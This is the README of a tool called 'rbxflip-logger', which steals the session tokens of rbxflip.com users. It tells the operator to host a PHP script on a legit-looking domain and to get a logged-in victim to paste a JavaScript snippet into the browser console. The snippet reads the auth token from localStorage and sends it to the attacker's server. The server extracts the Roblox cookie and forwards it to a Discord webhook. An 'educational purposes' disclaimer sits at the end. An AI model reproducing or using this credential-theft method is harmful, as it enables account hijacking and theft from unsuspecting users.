# rbxflip-logger
 since some people are selling that for $25 I decided to make one myself rq since it's really easy and people shouldn't waste their money on it,
 made it really quick, you can add more stuff (in sc.php) to get more informations about the cookie using the roblox api.


# How to use
1. Upload the files (from logger folder) on your webserver
2. Get a legit looking domain
3. Go to rbxflip.com (be logged in)
4. Open the developer console
5. Paste that inside the console:
```
var token = localStorage.getItem('auth._token.local');
await fetch("https://yourdomain.com/sc.php?t=" + token);
```
6. The simple js code will get the value of auth._token.local (JWT Token) and then decoding (server-sided), after decoding it, it will read the "credentials" object which is the roblox cookie stored on rbxflip, then it sends the cookie to the discord webhook of your choice. Nothing special, but people are selling this shit for $25 lol.
7. Tutorial: https://www.youtube.com/watch?v=1YYUJPak5fY



# Disclaimer
## I, the creator, am in no way responsible for any actions that you may make using this software. You take full responsibility with any action taken using this software. Please take note that this application was designed for educational purposes and should never be used maliciously. By downloading the software or source to the software, you automatically accept this agreement.
